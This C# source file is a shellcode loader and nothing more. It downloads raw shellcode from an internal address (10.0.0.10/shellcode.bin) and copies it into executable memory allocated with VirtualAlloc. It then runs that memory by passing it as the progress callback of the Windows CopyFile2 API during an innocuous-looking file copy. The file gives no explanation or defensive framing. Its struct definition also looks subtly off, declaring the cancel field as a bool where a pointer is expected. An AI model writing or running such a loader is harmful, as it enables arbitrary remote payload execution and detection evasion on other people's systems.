using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace CopyFile2
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string url = "http://10.0.0.10/shellcode.bin";
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] shellcode = client.DownloadData(url);

            IntPtr addr = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x3000, 0x40);
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            COPYFILE2_EXTENDED_PARAMETERS parameters = new COPYFILE2_EXTENDED_PARAMETERS
            {
                dwSize = (uint)Marshal.SizeOf(typeof(COPYFILE2_EXTENDED_PARAMETERS)),
                dwCopyFlags = COPY_FILE_EXTENDED_PARAMETERS_FLAGS.COPY_FILE_FAIL_IF_EXISTS,
                pfCancel = false,
                pProgressRoutine = addr,
                pvCallbackContext = IntPtr.Zero
            };

            DeleteFile("C:\\Windows\\Temp\\backup.log");

            bool result = CopyFile2("C:\\Windows\\DirectX.log", "C:\\Windows\\Temp\\backup.log", ref parameters);
            if (!result)
            {
                throw new Exception("CopyFile2 failed");
            }

        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, int flAllocationType, int flProtect);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CopyFile2(string pwszExistingFileName, string pwszNewFileName, ref COPYFILE2_EXTENDED_PARAMETERS pExtendedParameters);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool DeleteFile(string lpFileName);

        [StructLayout(LayoutKind.Sequential)]
        struct COPYFILE2_EXTENDED_PARAMETERS
        {
            public uint dwSize;
            public COPY_FILE_EXTENDED_PARAMETERS_FLAGS dwCopyFlags;
            public bool pfCancel;
            public IntPtr pProgressRoutine;
            public IntPtr pvCallbackContext;
        }

        [Flags]
        enum COPY_FILE_EXTENDED_PARAMETERS_FLAGS : uint
        {
            COPY_FILE_FAIL_IF_EXISTS = 0x1,
            COPY_FILE_RESTARTABLE = 0x2,
            COPY_FILE_OPEN_SOURCE_FOR_WRITE = 0x4,
            COPY_FILE_ALLOW_DECRYPTED_DESTINATION = 0x8,
            COPY_FILE_COPY_SYMLINK = 0x800,
            COPY_FILE_NO_BUFFERING = 0x1000
        }

    }
}
